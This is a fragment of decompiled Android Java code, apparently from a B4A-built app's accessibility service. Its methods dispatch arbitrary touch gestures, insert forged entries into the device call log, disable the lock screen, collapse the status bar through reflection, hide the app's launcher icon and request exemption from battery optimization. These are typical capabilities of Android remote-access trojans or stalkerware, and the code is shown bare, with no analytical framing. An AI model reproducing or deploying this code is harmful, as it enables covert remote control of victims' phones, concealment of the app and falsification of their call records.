        ba.raiseEvent2(null, true, "setba", false, ba);
    }

    public void DispatchGesturePattren(int i, int i2, ArrayList arrayList, ArrayList arrayList2, int i3) {
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(i, i2);
        for (int i4 = 0; i4 < arrayList.size(); i4++) {
            path.lineTo(Math.abs(((Integer) arrayList.get(i4)).intValue()), Math.abs(((Integer) arrayList2.get(i4)).intValue()));
        }
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0L, i3));
        super.dispatchGesture(builder.build(), null, null);
    }

    public void insertPlaceholderCall(String str, String str2) {
        ContentResolver contentResolver = getContentResolver();
        ContentValues contentValues = new ContentValues();
        contentValues.put("number", str);
        contentValues.put("date", Long.valueOf(System.currentTimeMillis()));
        contentValues.put("duration", (Integer) 0);
        contentValues.put("type", (Integer) 2);
        contentValues.put("new", (Integer) 1);
        contentValues.put("name", str2);
        contentValues.put("numbertype", (Integer) 0);
        contentValues.put("numberlabel", str2);
        contentResolver.insert(CallLog.Calls.CONTENT_URI, contentValues);
        BA.Log("Added : " + str + " name : " + str2);
    }

    public void trytowakeup() {
        ((KeyguardManager) getSystemService("keyguard")).newKeyguardLock("TAG").disableKeyguard();
    }

    public boolean isIgnoringBatteryOptimizations() {
        BA.Log("background service isIgnoringBatteryOptimizations");
        return ((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName());
    }

    public boolean isIgnoringBatteryOptimizations2(Context context) {
        BA.Log("background service isIgnoringBatteryOptimizations2");
        return ((PowerManager) context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName());
    }

    public void ShowPermissionDialog() {
        BA.Log("ShowPermissionDialog requested -------");
        Intent intent = new Intent();
        String packageName = getPackageName();
        if (((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(packageName)) {
            intent.setAction("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS");
        } else {
            intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
            intent.setData(Uri.parse("package:" + packageName));
        }
        intent.addFlags(ClientDefaults.MAX_MSG_SIZE);
        startActivity(intent);
    }

    public void checkstatusbar(String str) {
        try {
            Object systemService = getSystemService("statusbar");
            Method method = Class.forName("android.app.StatusBarManager").getMethod("collapse", new Class[0]);
            method.setAccessible(true);
            method.invoke(systemService, new Object[0]);
        } catch (Exception unused) {
        }
    }

    public void hideappicon(String str) {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, str), 2, 1);
        } catch (Exception e) {
            BA.Log(e.getMessage().toString());
        }
    }

    public void unhideappicon(String str) {
        try {
            getPackageManager().setComponentEnabledSetting(new ComponentName(this, str), 1, 1);
        } catch (Exception e) {
            BA.Log(e.getMessage().toString());
        }
    }

    public void turnonwifilow() {
        try {
            BA.Log("turnonwifilow");
            WifiManager wifiManager = (WifiManager) getSystemService("wifi");
            if (Build.VERSION.SDK_INT >= 29) {
                wifiManager.createWifiLock(4, "mylock");
            } else {
                wifiManager.createWifiLock(1, "mylock");
            }
        } catch (Exception e) {
            BA.Log(e.getMessage().toString());
        }
    }
}